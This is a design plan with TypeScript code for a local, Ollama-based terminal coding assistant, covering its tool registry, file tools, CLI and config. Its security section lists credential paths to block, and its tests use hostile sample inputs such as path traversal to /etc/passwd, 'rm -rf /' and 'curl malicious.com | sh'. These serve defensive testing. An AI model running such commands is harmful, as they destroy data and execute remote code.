# QCode Implementation Plan - TypeScript

## Local AI Coding Assistant (Claude Coder Alternative)

## What QCode Is

QCode is a **terminal-based AI coding assistant** that provides a local alternative to Claude Coder by:

1. **Talking to Local LLMs** - Uses Ollama instead of Claude/GPT APIs
2. **Direct Internal Tools** - Fast, native TypeScript tools for core functionality
3. **MCP Client Integration** - Connects to external MCP tools via stdin/stdout and HTTP
4. **JSON Tool Calling** - Structured outputs for reliable tool execution
5. **Managing Context** - Understands project structure and maintains conversation history
6. **Executing Tasks** - Performs multi-step coding tasks autonomously
7. **Working with Any Editor** - Terminal-based, integrates with VS Code, Vim, etc.

**The Core Loop:**

```
User Query → Context Analysis → LLM Processing (JSON) → Tool Execution (Direct + MCP) → Response
```

**Key Difference from Cursor:**

- Cursor = AI-powered IDE/editor
- QCode = Terminal AI assistant that works alongside your existing editor

**Key Difference from Claude Coder:**

- Claude Coder = Uses remote APIs (Claude, GPT)
- QCode = Uses local LLMs (Ollama) for privacy and control

**Why Build QCode?**
Claude Coder is excellent, but API costs add up fast during serious development:

- ✅ **Same great experience** - Terminal-based AI coding assistant
- ✅ **Zero API costs** - Uses local Ollama models instead of Claude API
- ✅ **Privacy first** - Your code never leaves your machine
- ✅ **Always available** - No rate limits or API downtime
- ✅ **Customizable** - Use any local model (deepseek-coder, qwen, etc.)

## 🧠 Hybrid Workflow: Galaxy Brain + Execution Brain

### The Smart Strategy: Use Both Tools Together

**Claude Coder = Galaxy Brain 🌌**

- Complex architectural decisions
- High-level refactoring strategy
- Advanced problem-solving
- Code review and optimization
- When you need the absolute best reasoning

**QCode = Execution Brain ⚡**

- Implementing the plan Claude Coder designed
- Repetitive tasks (file operations, simple edits)
- Quick code generation and fixes
- Daily development workflow
- Testing and iteration cycles

### Example Workflow:

```bash
# 1. Use Claude Coder for strategic thinking
claude-coder "Design the architecture for a new user authentication system"

# 2. Use QCode to execute the implementation
qcode "Create the user model file with the fields Claude suggested"
qcode "Add the authentication middleware to the routes"
qcode "Write unit tests for the auth functions"
qcode "Update the database migration files"
```

### Cost-Effective Development Strategy:

- **$2-5 for strategic session** with Claude Coder (high-value decisions)
- **$0 for implementation** with QCode (repetitive execution)
- **Result**: 80% cost savings while keeping the best parts of both tools

## 🎯 TypeScript Implementation Plan - Hybrid Architecture

### Core Principles

1. **Direct Internal Tools**: Fast, native TypeScript for core functionality
2. **MCP Client**: Connect to external MCP tools (stdin/stdout + HTTP streaming)
3. **JSON Tool Calling**: Structured outputs for reliable automation
4. **Minimal Dependencies**: Use only what's necessary
5. **Professional-grade UX**: Claude Coder-level coding assistant experience
6. **Security First**: Workspace-contained operations with proper validation
7. **Error Recovery**: Robust handling of failures and reconnections

### 🏗️ Planned Architecture

```
src/
├── core/
│   ├── client.ts        # Ollama HTTP client with JSON support
│   ├── engine.ts        # Hybrid tool orchestration with streaming
│   ├── context.ts       # Project understanding and memory
│   ├── registry.ts      # Namespaced tool registry (internal + MCP)
│   └── security.ts      # Security validation and workspace enforcement
├── tools/
│   ├── files.ts         # Direct TypeScript file operations
│   ├── shell.ts         # Secure shell execution
│   ├── git.ts           # Direct git operations
│   ├── search.ts        # Direct code search & analysis
│   ├── edit.ts          # Direct code editing with diffs
│   └── project.ts       # Direct project structure analysis
├── mcp/
│   ├── client.ts        # Robust MCP client with discovery
│   ├── stdio.ts         # stdin/stdout transport with proper protocol
│   ├── http.ts          # HTTP streaming transport
│   └── discovery.ts     # MCP tool discovery and registration
├── config/
│   ├── validation.ts    # Configuration validation with Zod
│   ├── manager.ts       # Configuration management
│   └── defaults.ts      # Default configurations
├── security/
│   ├── workspace.ts     # Workspace boundary enforcement
│   ├── paths.ts         # Path traversal prevention
│   └── commands.ts      # Command injection prevention
├── types.ts             # Core TypeScript interfaces
└── cli.ts               # CLI interface with streaming UX
```

### 📦 Dependencies

```json
{
  "dependencies": {
    "@types/node": "^20.10.0",
    "typescript": "^5.3.0",
    "commander": "^11.1.0",
    "chalk": "^5.3.0",
    "fast-glob": "^3.3.2",
    "zod": "^3.22.4",
    "@modelcontextprotocol/sdk": "^0.4.0",
    "ollama": "^0.5.16",
    "node-diff3": "^3.1.1",
    "zod-to-json-schema": "^3.22.4",
    "normalize-path": "^3.0.0",
    "is-path-inside": "^4.0.0",
    "micromatch": "^4.0.5",
    "sanitize-filename": "^1.6.3",
    "shell-escape": "^0.2.0"
  },
  "devDependencies": {
    "@types/jest": "^29.5.8",
    "@types/micromatch": "^4.0.6",
    "@types/nock": "^10.0.3",
    "@types/normalize-path": "^3.0.2",
    "@types/shell-escape": "^0.2.3",
    "jest": "^29.7.0",
    "nock": "^14.0.5",
    "ts-jest": "^29.1.1",
    "prettier": "^3.1.0"
  }
}
```

**Key Architectural Decisions:**

- **`ollama`**: Official Ollama client library for robust API integration
- **`micromatch`**: Advanced glob pattern matching for security
- **`sanitize-filename`**: Secure filename sanitization
- **`shell-escape`**: Proper argument escaping for command execution
- **`nock`**: HTTP mocking for VCR-style testing without custom implementation

## 🚀 Implementation Phases

### Phase 1: Core Foundation + Security (Week 1)

**Goal**: Build secure foundation with Ollama + namespaced internal tools

We'll implement these core interfaces:

```typescript
// types.ts - Core interfaces with proper namespacing
export interface NamespacedTool {
  namespace: string;
  name: string;
  fullName: string; // "namespace.name"
  definition: ToolDefinition;
  execute: (args: any) => Promise<any>;
}

export interface MCPServerInfo {
  name: string;
  type: 'stdio' | 'http';
  connected: boolean;
  tools: Map<string, ToolDefinition>;
  client: MCPStdioClient | MCPHttpClient;
}

export interface ValidationResult<T = any> {
  valid: boolean;
  error?: string;
  code?: string;
  data?: T;
  safePath?: string;
}

// security/workspace.ts - Workspace boundary enforcement
import { resolve, relative } from 'path';
import isPathInside from 'is-path-inside';
import normalizePath from 'normalize-path';

export class WorkspaceSecurity {
  private workspaceRoot: string;
  private forbiddenPatterns: RegExp[];

  constructor(workspaceRoot: string, config: SecurityConfig) {
    this.workspaceRoot = resolve(workspaceRoot);
    this.forbiddenPatterns = config.forbiddenPatterns.map(p => new RegExp(p));
  }

  validatePath(path: string): ValidationResult {
    try {
      const normalizedPath = normalizePath(resolve(path));

      // Check if path is within workspace
      if (!isPathInside(normalizedPath, this.workspaceRoot)) {
        return {
          valid: false,
          error: 'Path outside workspace boundary',
          code: 'WORKSPACE_VIOLATION',
        };
      }

      // Check forbidden patterns
      for (const pattern of this.forbiddenPatterns) {
        if (pattern.test(normalizedPath)) {
          return {
            valid: false,
            error: `Path matches forbidden pattern: ${pattern}`,
            code: 'FORBIDDEN_PATTERN',
          };
        }
      }

      // Check for path traversal attempts
      const relativePath = relative(this.workspaceRoot, normalizedPath);
      if (relativePath.startsWith('..')) {
        return {
          valid: false,
          error: 'Path traversal attempt detected',
          code: 'PATH_TRAVERSAL',
        };
      }

      return { valid: true, safePath: normalizedPath };
    } catch (error) {
      return {
        valid: false,
        error: `Invalid path: ${error.message}`,
        code: 'INVALID_PATH',
      };
    }
  }
}

// core/registry.ts - Tool registry with namespacing
export class ToolRegistry {
  private internalTools = new Map<string, NamespacedTool>();
  private mcpServers = new Map<string, MCPServerInfo>();
  private allTools = new Map<string, NamespacedTool>();

  constructor(private security: WorkspaceSecurity) {}

  // Register internal tools with "internal" namespace
  registerInternal(tool: InternalTool): void {
    const namespacedTool: NamespacedTool = {
      namespace: 'internal',
      name: tool.name,
      fullName: `internal.${tool.name}`,
      definition: tool.toOllamaFormat(),
      execute: args => this.executeWithSecurity(tool, args),
    };

    this.internalTools.set(namespacedTool.fullName, namespacedTool);
    this.allTools.set(namespacedTool.fullName, namespacedTool);
  }

  // Register MCP server and discover its tools
  async registerMCPServer(
    serverName: string,
    client: MCPStdioClient | MCPHttpClient
  ): Promise<void> {
    try {
      // Discover tools from MCP server
      const tools = await client.listTools();
      const toolMap = new Map<string, ToolDefinition>();

      for (const tool of tools) {
        const namespacedTool: NamespacedTool = {
          namespace: serverName,
          name: tool.name,
          fullName: `${serverName}.${tool.name}`,
          definition: tool,
          execute: args => client.callTool(tool.name, args),
        };

        toolMap.set(tool.name, tool);
        this.allTools.set(namespacedTool.fullName, namespacedTool);
      }

      const serverInfo: MCPServerInfo = {
        name: serverName,
        type: client instanceof MCPStdioClient ? 'stdio' : 'http',
        connected: true,
        tools: toolMap,
        client,
      };

      this.mcpServers.set(serverName, serverInfo);
      console.log(`✅ Registered MCP server: ${serverName} with ${tools.length} tools`);
    } catch (error) {
      console.error(`❌ Failed to register MCP server ${serverName}:`, error.message);
      throw error;
    }
  }

  // Execute tool by full namespaced name
  async executeTool(fullName: string, args: any): Promise<any> {
    const tool = this.allTools.get(fullName);
    if (!tool) {
      // Try to find tool by partial name for backward compatibility
      const matchingTools = Array.from(this.allTools.values()).filter(t => t.name === fullName);

      if (matchingTools.length === 0) {
        throw new QCodeError(`Tool not found: ${fullName}`, 'TOOL_NOT_FOUND');
      }

      if (matchingTools.length > 1) {
        const suggestions = matchingTools.map(t => t.fullName).join(', ');
        throw new QCodeError(
          `Ambiguous tool name: ${fullName}. Use full name: ${suggestions}`,
          'AMBIGUOUS_TOOL_NAME'
        );
      }

      return await matchingTools[0].execute(args);
    }

    return await tool.execute(args);
  }

  // Get all available tools for Ollama (with namespaced names)
  getAvailableTools(): ToolDefinition[] {
    return Array.from(this.allTools.values()).map(tool => ({
      ...tool.definition,
      function: {
        ...tool.definition.function,
        name: tool.fullName, // Use namespaced name
      },
    }));
  }

  private async executeWithSecurity(tool: InternalTool, args: any): Promise<any> {
    // Security validation for internal tools
    if (tool.name === 'files' && args.path) {
      const validation = this.security.validatePath(args.path);
      if (!validation.valid) {
        throw new QCodeError(validation.error, validation.code);
      }
      args.path = validation.safePath;
    }

    return await tool.execute(args);
  }
}

// tools/files.ts - Secure file operations
import { promises as fs } from 'fs';
import { z } from 'zod';
import glob from 'fast-glob';
import { zodToJsonSchema } from 'zod-to-json-schema';

export class FilesTool {
  name = 'files';
  description = 'Secure file system operations within workspace';

  schema = z.object({
    action: z.enum(['read', 'write', 'list', 'search']),
    path: z.string(),
    content: z.string().optional(),
    pattern: z.string().optional(),
    lines: z.object({ start: z.number(), end: z.number() }).optional(),
  });

  async execute(args: z.infer<typeof this.schema>): Promise<any> {
    // Security validation happens in registry before this point
    switch (args.action) {
      case 'read':
        if (args.lines) {
          return await this.readLines(args.path, args.lines.start, args.lines.end);
        }
        return { content: await fs.readFile(args.path, 'utf8') };

      case 'write':
        if (!args.content) throw new Error('Content required for write operation');
        await fs.writeFile(args.path, args.content);
        return { success: true, path: args.path };

      case 'list':
        const files = await glob(args.pattern || '*', {
          cwd: args.path,
          onlyFiles: false,
          markDirectories: true,
        });
        return { files };

      case 'search':
        if (!args.pattern) throw new Error('Pattern required for search');
        const results = await this.searchFiles(args.pattern, args.path);
        return { results };
    }
  }

  private async readLines(filePath: string, start: number, end: number): Promise<any> {
    const content = await fs.readFile(filePath, 'utf8');
    const lines = content.split('\n');
    const selectedLines = lines.slice(start - 1, end);
    return {
      content: selectedLines.join('\n'),
      totalLines: lines.length,
      selectedRange: { start, end },
    };
  }

  private async searchFiles(pattern: string, searchPath: string): Promise<any[]> {
    const files = await glob('**/*', {
      cwd: searchPath,
      onlyFiles: true,
      ignore: ['node_modules/**', '.git/**', '*.log'],
    });

    const results = [];
    const regex = new RegExp(pattern, 'gi');

    for (const file of files) {
      try {
        const fullPath = `${searchPath}/${file}`;
        const content = await fs.readFile(fullPath, 'utf8');
        const matches = [...content.matchAll(regex)];

        if (matches.length > 0) {
          results.push({
            file,
            matches: matches.length,
            lines: this.getMatchingLines(content, regex),
          });
        }
      } catch (error) {
        // Skip files that can't be read (binary, permissions, etc.)
        continue;
      }
    }

    return results;
  }

  private getMatchingLines(content: string, regex: RegExp): any[] {
    const lines = content.split('\n');
    const matchingLines = [];

    lines.forEach((line, index) => {
      if (regex.test(line)) {
        matchingLines.push({
          lineNumber: index + 1,
          content: line.trim(),
        });
      }
    });

    return matchingLines;
  }

  toOllamaFormat(): ToolDefinition {
    return {
      type: 'function',
      function: {
        name: this.name,
        description: this.description,
        parameters: zodToJsonSchema(this.schema),
      },
    };
  }
}
```

## 🎯 **Goal: Production-Ready Implementation**

The final implementation will be **enterprise-grade** with proper error handling, security hardening, and user experience that rivals Claude Coder while maintaining zero API costs and full privacy control.

## 🎯 Core Tools (Internal, Fast)

```typescript
// All tools use consistent interface
interface InternalTool {
  name: string;
  description: string;
  schema: ZodSchema;
  execute(args: any): Promise<any>;
  toOllamaFormat(): ToolDefinition;
}

// FilesTool, EditTool, GitTool, ShellTool, SearchTool, ProjectTool
```

## 🎨 Professional CLI Experience

### Streaming UX with Tool Indicators

```typescript
// Real-time feedback during execution
🧠 Building context...
🔧 Using internal.files...
✅ Found 12 TypeScript files
🔧 Using internal.search...
✅ Located main entry point: src/index.ts

Here's what I found in your TypeScript project...
```

### Interactive Chat Mode

```typescript
export class CLIInterface {
  async startChatMode(): Promise<void> {
    console.log(chalk.blue('🤖 QCode Interactive Mode'));
    console.log(chalk.gray('Type "exit" to quit, "help" for commands\n'));

    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
      prompt: chalk.blue('qcode> '),
    });

    rl.on('line', async input => {
      const query = input.trim();

      if (query === 'exit' || query === 'quit') {
        this.rl?.close();
        console.log(chalk.yellow('👋 Goodbye!'));
        process.exit(0);
      }

      // Handle Claude Coder-compatible slash commands
      if (query.startsWith('/')) {
        await this.handleSlashCommand(query);
        rl.prompt();
        return;
      }

      if (query) {
        await this.processQuery(query);
      }

      console.log();
      rl.prompt();
    });
  }

  private async handleSlashCommand(command: string): Promise<void> {
    const [cmd, ...args] = command.slice(1).split(' ');

    switch (cmd) {
      case 'init':
        await this.processQuery(
          'Create a QCODE.md file with project context and coding conventions'
        );
        break;
      case 'config':
        await this.showConfiguration();
        break;
      case 'mcp':
        await this.showMCPStatus();
        break;
      case 'commit':
        await this.processQuery('Create a git commit for the current changes');
        break;
      case 'pr':
        await this.processQuery('Create a pull request for the current branch');
        break;
      default:
        console.log(chalk.red(`Unknown command: /${cmd}`));
        console.log(chalk.gray('Type "help" to see available commands'));
    }
  }

  private showHelp(): void {
    console.log(chalk.cyan('\nAvailable commands:'));
    console.log('  help     - Show this help message');
    console.log('  clear    - Clear the screen');
    console.log('  exit     - Exit QCode');

    console.log(chalk.cyan('\nSlash commands (Claude Coder compatible):'));
    console.log('  /init    - Initialize project memory (QCODE.md)');
    console.log('  /config  - Configure QCode settings');
    console.log('  /mcp     - Show MCP server status');
    console.log('  /commit  - Create a git commit');
    console.log('  /pr      - Create a pull request');

    console.log(chalk.cyan('\nExample queries:'));
    console.log('  "What files are in this project?"');
    console.log('  "Create a TypeScript interface for User"');
    console.log('  "Add error handling to the auth function"');
    console.log('  "Run the tests and fix any failures"\n');
  }

  private handleError(error: any): void {
    if (error instanceof QCodeError) {
      console.error(chalk.red('Error:'), error.message);
      if (error.recoverable) {
        console.log(chalk.yellow('💡 Tip:'), this.getErrorTip(error.code));
      }
    } else {
      console.error(chalk.red('Unexpected error:'), error.message);
    }
  }

  private getErrorTip(errorCode: string): string {
    const tips = {
      OLLAMA_CONNECTION_ERROR: 'Try running "ollama serve"',
      TOOL_NOT_FOUND: 'Check available tools with "help"',
      MCP_CONNECTION_FAILED: 'Check MCP server configuration',
    };
    return tips[errorCode] || 'Check documentation';
  }
}
```

### Usage Modes

```bash
# One-shot commands
qcode "List TypeScript files and show me the main entry point"
qcode "Create a README file for this project"
qcode "Fix the linting errors in src/utils.ts"

# Interactive mode
qcode
🤖 QCode Interactive Mode
qcode> What files are in this project?
🔧 Using internal.files...
✅ Found 23 files in workspace

qcode> /commit
🔧 Using internal.git...
✅ Created commit: "Add user authentication module"

qcode> exit
👋 Goodbye!
```

## 🔒 Security Model (Unix/Linux Focus)

### Workspace Boundary Enforcement

```typescript
// All operations contained within workspace root
export class WorkspaceSecurity {
  validatePath(path: string): ValidationResult {
    const normalizedPath = normalizePath(resolve(path));

    // Ensure path is within workspace
    if (!isPathInside(normalizedPath, this.workspaceRoot)) {
      return { valid: false, code: 'WORKSPACE_VIOLATION' };
    }

    // Prevent path traversal
    const relativePath = relative(this.workspaceRoot, normalizedPath);
    if (relativePath.startsWith('..')) {
      return { valid: false, code: 'PATH_TRAVERSAL' };
    }

    return { valid: true, safePath: normalizedPath };
  }
}
```

### Secure Defaults

```json
{
  "security": {
    "forbiddenPatterns": [
      ".*\\.env.*", // Environment files
      ".*/\\.ssh/.*", // SSH keys
      ".*/\\.aws/.*", // AWS credentials
      ".*/secrets/.*", // Secret directories
      "/etc/passwd", // System files
      "/etc/shadow",
      "/tmp/.*",
      "/var/log/.*"
    ],
    "allowedCommands": ["git", "ls", "cat", "grep", "find"],
    "workspaceOnly": true
  }
}
```

### Command Injection Prevention

```typescript
// Whitelist approach with argument validation
export class CommandSecurity {
  validateCommand(command: string, args: string[]): ValidationResult {
    const allowedCommands = ['git', 'ls', 'cat', 'grep', 'find'];

    if (!allowedCommands.includes(command)) {
      return { valid: false, code: 'COMMAND_NOT_ALLOWED' };
    }

    // Validate arguments don't contain dangerous patterns
    const dangerousPatterns = ['&&', '||', ';', '|', '>', '<', '`', '$'];
    const hasUnsafeArgs = args.some(arg =>
      dangerousPatterns.some(pattern => arg.includes(pattern))
    );

    if (hasUnsafeArgs) {
      return { valid: false, code: 'UNSAFE_ARGUMENTS' };
    }

    return { valid: true };
  }
}
```

## 🔧 Configuration System

### Hierarchical Configuration

```typescript
// 1. Built-in defaults
// 2. Global config: ~/.qcode/config.json
// 3. Project config: .qcode/config.json
// 4. Environment variables
// 5. CLI arguments

export const DEFAULT_CONFIG = {
  model: 'deepseek-coder:33b',
  ollamaUrl: 'http://localhost:11434',
  maxTokens: 8192,
  outputFormat: 'stream',

  security: {
    workspaceOnly: true,
    forbiddenPatterns: ['.*\\.env.*', '.*/\\.ssh/.*', '.*/secrets/.*'],
  },

  mcp: {
    enabled: false,
    servers: [],
  },
};
```

### Configuration Validation

```typescript
const ConfigSchema = z.object({
  model: z.string().min(1),
  ollamaUrl: z.string().url(),
  maxTokens: z.number().positive(),

  security: z.object({
    workspaceOnly: z.boolean(),
    forbiddenPatterns: z.array(z.string()),
  }),

  mcp: z.object({
    enabled: z.boolean(),
    servers: z.array(MCPServerSchema),
  }),
});

export function loadConfig(): Config {
  const configs = [
    DEFAULT_CONFIG,
    loadGlobalConfig(),
    loadProjectConfig(),
    loadEnvConfig(),
    loadCliConfig(),
  ];

  const merged = configs.reduce((acc, config) => ({ ...acc, ...config }), {});

  const result = ConfigSchema.safeParse(merged);
  if (!result.success) {
    throw new QCodeError(`Invalid configuration: ${result.error.message}`, 'CONFIG_INVALID');
  }

  return result.data;
}
```

## 🧪 Testing Strategy - Real API with VCR

### Core Testing Philosophy

- ✅ **Real Ollama API** - Test against actual model responses for realistic behavior
- ✅ **VCR-style Recording** - Record real interactions once, replay deterministically
- ✅ **Security First** - Comprehensive security testing before features
- ✅ **Progressive Coverage** - Unit → Integration → E2E

### VCR Implementation

```typescript
// Using nock for HTTP mocking with recorded fixtures
export function createOllamaMock(fixtureName: string) {
  const fixturePath = `./tests/fixtures/recordings/${fixtureName}.json`;
  const fixture = JSON.parse(fs.readFileSync(fixturePath, 'utf8'));

  return nock('http://localhost:11434').persist().post('/api/chat').reply(200, fixture.response);
}

// Usage in tests
test('file operations with real model responses', async () => {
  const mock = createOllamaMock('basic_chat_completion');

  const response = await ollamaClient.chat([
    { role: 'user', content: 'List TypeScript files in src/' },
  ]);

  expect(response.message.content).toContain('TypeScript');
  expect(mock.isDone()).toBe(true);
});
```

**Architectural Decision:** Used `nock` instead of custom VCR implementation for:

- Better Jest integration
- Reliable HTTP mocking
- Easier fixture management
- Standard testing patterns

### Test Architecture

```
tests/
├── unit/
│   ├── tools/          # Individual tool testing
│   ├── security/       # Security validation tests
│   └── config/         # Configuration tests
├── integration/
│   ├── ollama/         # Real Ollama API tests
│   ├── mcp/            # MCP server integration
│   └── workflows/      # Complete user workflows
├── fixtures/
│   ├── ollama-cassettes/    # Recorded API responses
│   ├── test-projects/       # Sample codebases
│   └── mcp-responses/       # MCP server responses
└── helpers/
    ├── vcr.ts              # Recording/playback
    ├── test-env.ts         # Test environment setup
    └── security-utils.ts   # Security test utilities
```

### Security Testing

```typescript
describe('Security Validation', () => {
  test('prevents path traversal attacks', () => {
    const attacks = [
      '../../../etc/passwd',
      '..\\..\\..\\etc\\passwd',
      '/etc/passwd',
      '~/../../etc/passwd',
    ];

    for (const attack of attacks) {
      const result = security.validatePath(attack);
      expect(result.valid).toBe(false);
    }
  });

  test('blocks command injection', () => {
    const malicious = ['ls; rm -rf /', 'cat /etc/passwd', 'curl malicious.com | sh'];

    for (const cmd of malicious) {
      expect(() => shell.execute(cmd)).toThrow();
    }
  });
});
```

## 📊 Success Metrics

### Technical Requirements

- ✅ **Zero critical security vulnerabilities**
- ✅ **>95% tool execution success rate**
- ✅ **<2s response time for simple queries**
- ✅ **>90% test coverage (unit + integration)**
- ✅ **Graceful handling of MCP server failures**

### User Experience Goals

- ✅ **Claude Coder-compatible commands and workflow**
- ✅ **Real-time streaming with clear progress indicators**
- ✅ **Helpful error messages with recovery suggestions**
- ✅ **Zero-config startup for basic usage**
- ✅ **Professional terminal experience**

### Performance Targets

- ✅ **Tool execution**: <500ms for file operations
- ✅ **MCP calls**: <2s timeout with retry logic
- ✅ **Context building**: <1s for typical projects
- ✅ **Memory usage**: <100MB baseline

## 📈 Implementation Timeline

### Week 1: Core Foundation

- Ollama client with function calling
- Internal tools (files, basic security)
- Simple CLI with one-shot commands
- **Deliverable**: `qcode "list files"` works

### Week 2: MCP Integration

- MCP stdio/HTTP clients
- Tool discovery and registration
- Namespaced tool execution
- **Deliverable**: External MCP tools work

### Week 3: Enhanced Tools + Context

- EditTool with diff support
- Basic project context
- Git integration
- **Deliverable**: Can edit files and understand project

### Week 4: Professional Experience

- Interactive chat mode
- Slash commands
- Configuration system
- Error handling and recovery
- **Deliverable**: Production-ready QCode

**Target**: Enterprise-grade QCode with proper error handling, security hardening, and user experience that rivals Claude Coder while maintaining zero API costs and full privacy control.
